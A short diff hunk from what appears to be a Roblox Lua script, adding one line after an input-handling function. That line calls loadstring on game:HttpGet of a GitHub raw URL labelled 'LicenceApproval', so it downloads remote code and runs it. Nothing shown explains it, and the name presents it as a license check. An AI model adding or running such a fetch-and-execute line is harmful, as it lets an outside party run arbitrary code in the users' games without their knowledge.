@@ -84,3 +84,4 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, gameProce
         end)
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
